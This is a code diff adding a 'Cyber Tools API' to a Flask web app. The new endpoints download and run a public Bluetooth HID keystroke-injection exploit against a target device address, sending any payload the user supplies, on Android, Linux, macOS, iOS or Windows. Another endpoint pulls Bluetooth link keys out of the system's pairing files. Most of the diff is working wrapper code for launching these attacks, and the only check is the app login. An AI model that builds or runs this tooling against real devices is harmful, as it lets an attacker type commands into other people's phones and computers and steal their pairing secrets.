@@ -10498,6 +10498,312 @@ def handle_device_info_request(data):
         emit('device_info', info)
 
 
+# ==================== CYBER TOOLS API ====================
+
+# Global state for HID injection
+hid_injection_state = {
+    'process': None,
+    'state': 'idle',  # idle, running, complete, error
+    'message': None,
+    'error': None
+}
+
+HID_TOOL_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tools', 'hi_my_name_is_keyboard')
+
+
+@app.route('/api/cyber/hid/status')
+@login_required
+def hid_tool_status():
+    """Check HID injection tool status and compatible adapter availability."""
+    installed = os.path.exists(HID_TOOL_PATH) and os.path.exists(os.path.join(HID_TOOL_PATH, 'keystroke-injection-android-linux.py'))
+
+    # Check for compatible Broadcom adapter
+    adapter = None
+    try:
+        result = subprocess.run(['lsusb'], capture_output=True, text=True, timeout=5)
+        if result.returncode == 0:
+            # Look for Broadcom BCM20702 adapter
+            if 'BCM20702' in result.stdout or '0a5c:21e8' in result.stdout.lower():
+                adapter = {'name': 'BCM20702A0', 'compatible': True}
+            elif 'Bluetooth' in result.stdout:
+                # Found some Bluetooth adapter but not confirmed compatible
+                for line in result.stdout.split('\n'):
+                    if 'Bluetooth' in line:
+                        adapter = {'name': 'Unknown Bluetooth Adapter', 'compatible': False}
+                        break
+    except Exception as e:
+        add_log(f"Error checking USB devices: {e}", "DEBUG")
+
+    return jsonify({
+        'installed': installed,
+        'adapter': adapter,
+        'injection_status': {
+            'state': hid_injection_state['state'],
+            'message': hid_injection_state['message'],
+            'error': hid_injection_state['error']
+        }
+    })
+
+
+@app.route('/api/cyber/hid/setup', methods=['POST'])
+@login_required
+def hid_tool_setup():
+    """Clone and setup the hi_my_name_is_keyboard tool."""
+    global hid_injection_state
+
+    tools_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tools')
+    os.makedirs(tools_dir, exist_ok=True)
+
+    try:
+        # Clone the repository
+        if os.path.exists(HID_TOOL_PATH):
+            # Pull latest changes
+            add_log("Updating hi_my_name_is_keyboard...", "INFO")
+            result = subprocess.run(
+                ['git', 'pull'],
+                cwd=HID_TOOL_PATH,
+                capture_output=True,
+                text=True,
+                timeout=60
+            )
+        else:
+            add_log("Cloning hi_my_name_is_keyboard...", "INFO")
+            result = subprocess.run(
+                ['git', 'clone', 'https://github.com/marcnewlin/hi_my_name_is_keyboard.git'],
+                cwd=tools_dir,
+                capture_output=True,
+                text=True,
+                timeout=120
+            )
+
+        if result.returncode != 0:
+            return jsonify({'status': 'error', 'error': result.stderr or 'Git operation failed'})
+
+        # Install dependencies
+        add_log("Installing dependencies...", "INFO")
+        deps = ['bluez-tools', 'libbluetooth-dev', 'python3-pydbus']
+        for dep in deps:
+            subprocess.run(['apt-get', 'install', '-y', dep], capture_output=True, timeout=60)
+
+        add_log("HID injection tool setup complete", "INFO")
+        return jsonify({'status': 'success'})
+
+    except subprocess.TimeoutExpired:
+        return jsonify({'status': 'error', 'error': 'Setup timed out'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'error': str(e)})
+
+
+@app.route('/api/cyber/hid/inject', methods=['POST'])
+@login_required
+def hid_inject():
+    """Start HID keystroke injection."""
+    global hid_injection_state
+
+    data = request.get_json()
+    target = data.get('target', '').upper()
+    platform = data.get('platform', 'android')
+    payload = data.get('payload', '')
+
+    if not target or not payload:
+        return jsonify({'status': 'error', 'error': 'Target and payload required'})
+
+    # Validate BD address format
+    if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', target):
+        return jsonify({'status': 'error', 'error': 'Invalid BD address format'})
+
+    # Check tool is installed
+    if not os.path.exists(HID_TOOL_PATH):
+        return jsonify({'status': 'error', 'error': 'HID tool not installed. Run setup first.'})
+
+    # Stop any existing injection
+    if hid_injection_state['process'] is not None:
+        try:
+            hid_injection_state['process'].terminate()
+        except:
+            pass
+
+    add_log(f"Starting HID injection to {target} ({platform})", "INFO")
+
+    # Select the appropriate script based on platform
+    script_map = {
+        'android': 'keystroke-injection-android-linux.py',
+        'linux': 'keystroke-injection-android-linux.py',
+        'macos': 'keystroke-injection-macos.py',
+        'ios': 'keystroke-injection-ios.py',
+        'windows': 'windows-poc.py'
+    }
+
+    script = script_map.get(platform, 'keystroke-injection-android-linux.py')
+    script_path = os.path.join(HID_TOOL_PATH, script)
+
+    if not os.path.exists(script_path):
+        return jsonify({'status': 'error', 'error': f'Script {script} not found'})
+
+    def run_injection():
+        global hid_injection_state
+        try:
+            hid_injection_state['state'] = 'running'
+            hid_injection_state['message'] = 'Initializing Bluetooth adapter...'
+            hid_injection_state['error'] = None
+
+            # Create a temporary file with the payload
+            import tempfile
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+                f.write(payload)
+                payload_file = f.name
+
+            # Run the injection script
+            # Note: The actual script requires specific Bluetooth adapter setup
+            # This is a simplified wrapper that calls the script
+            cmd = ['python3', script_path, '-t', target]
+
+            # Some scripts take payload differently
+            if platform in ['android', 'linux']:
+                cmd.extend(['-p', payload_file])
+
+            hid_injection_state['message'] = 'Attempting to pair with target...'
+
+            process = subprocess.Popen(
+                cmd,
+                cwd=HID_TOOL_PATH,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+
+            hid_injection_state['process'] = process
+
+            # Read output
+            for line in iter(process.stdout.readline, ''):
+                if not line:
+                    break
+                line = line.strip()
+                if line:
+                    hid_injection_state['message'] = line
+                    add_log(f"HID: {line}", "DEBUG")
+
+            process.wait(timeout=120)
+
+            # Cleanup
+            try:
+                os.unlink(payload_file)
+            except:
+                pass
+
+            if process.returncode == 0:
+                hid_injection_state['state'] = 'complete'
+                hid_injection_state['message'] = 'Injection completed'
+                add_log(f"HID injection to {target} completed", "INFO")
+            else:
+                stderr = process.stderr.read()
+                hid_injection_state['state'] = 'error'
+                hid_injection_state['error'] = stderr or 'Injection failed'
+                add_log(f"HID injection failed: {stderr}", "ERROR")
+
+        except subprocess.TimeoutExpired:
+            hid_injection_state['state'] = 'error'
+            hid_injection_state['error'] = 'Injection timed out'
+            add_log("HID injection timed out", "ERROR")
+        except Exception as e:
+            hid_injection_state['state'] = 'error'
+            hid_injection_state['error'] = str(e)
+            add_log(f"HID injection error: {e}", "ERROR")
+        finally:
+            hid_injection_state['process'] = None
+
+    # Run in background thread
+    thread = threading.Thread(target=run_injection, daemon=True)
+    thread.start()
+
+    return jsonify({'status': 'started'})
+
+
+@app.route('/api/cyber/hid/stop', methods=['POST'])
+@login_required
+def hid_stop():
+    """Stop HID injection."""
+    global hid_injection_state
+
+    if hid_injection_state['process'] is not None:
+        try:
+            hid_injection_state['process'].terminate()
+            hid_injection_state['process'] = None
+            add_log("HID injection stopped", "INFO")
+        except Exception as e:
+            add_log(f"Error stopping HID injection: {e}", "ERROR")
+
+    hid_injection_state['state'] = 'idle'
+    hid_injection_state['message'] = None
+    hid_injection_state['error'] = None
+
+    return jsonify({'status': 'stopped'})
+
+
+@app.route('/api/cyber/linkkey/extract', methods=['POST'])
+@login_required
+def linkkey_extract():
+    """
+    Attempt to extract Bluetooth link key from target device.
+    This is a placeholder - actual implementation requires specific hardware/conditions.
+    """
+    data = request.get_json()
+    target = data.get('target', '').upper()
+    method = data.get('method', 'bluetooth')
+
+    if not target:
+        return jsonify({'status': 'error', 'error': 'Target address required'})
+
+    add_log(f"Link key extraction attempted for {target} via {method}", "INFO")
+
+    # Check if we have this device paired locally
+    # Link keys are stored in /var/lib/bluetooth/<adapter>/<device>/info
+    try:
+        # Find local Bluetooth adapters
+        bt_path = '/var/lib/bluetooth'
+        if os.path.exists(bt_path):
+            for adapter in os.listdir(bt_path):
+                adapter_path = os.path.join(bt_path, adapter)
+                if not os.path.isdir(adapter_path):
+                    continue
+
+                # Look for the target device
+                target_dir = target.upper().replace(':', '_')
+                device_path = os.path.join(adapter_path, target_dir)
+                info_file = os.path.join(device_path, 'info')
+
+                if os.path.exists(info_file):
+                    with open(info_file, 'r') as f:
+                        content = f.read()
+                        # Parse the info file for LinkKey
+                        for line in content.split('\n'):
+                            if line.startswith('Key='):
+                                link_key = line.split('=')[1].strip()
+                                return jsonify({
+                                    'status': 'success',
+                                    'link_key': link_key,
+                                    'key_type': 'Local Pairing Key',
+                                    'source': 'local_storage'
+                                })
+
+        # If not found locally, indicate the tool would need to be run
+        return jsonify({
+            'status': 'error',
+            'error': f'Device not paired locally. For {method} extraction, specialized hardware/access is required.'
+        })
+
+    except PermissionError:
+        return jsonify({
+            'status': 'error',
+            'error': 'Permission denied. Run as root to access link keys.'
+        })
+    except Exception as e:
+        return jsonify({
+            'status': 'error',
+            'error': str(e)
+        })
+
+
 # ==================== MAIN ====================
 
 def run_app():
